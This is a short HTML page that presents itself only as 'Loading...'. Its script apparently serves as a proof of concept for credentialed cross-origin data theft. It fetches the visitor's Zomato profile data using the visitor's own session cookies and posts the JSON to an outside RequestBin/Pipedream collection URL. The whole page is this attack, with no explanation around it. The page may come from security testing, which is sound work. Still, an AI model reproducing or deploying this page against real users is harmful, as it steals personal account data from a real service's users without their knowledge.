<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<div id="status"></div>
<script>
function log(msg) {
    document.getElementById('status').innerHTML += msg + '<br>';
}

log('Starting...');

fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
    credentials: 'include'
})
.then(response => {
    log('Got response: ' + response.status);
    return response.json();
})
.then(data => {
    log('Got data: ' + JSON.stringify(data).substring(0, 100));
    
    // Send to RequestBin
    return fetch('https://eomfuajl79ed6za.m.pipedream.net', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
})
.then(() => {
    log('Data sent successfully!');
})
.catch(err => {
    log('Error: ' + err.message);
});
</script>
</body>
</html>
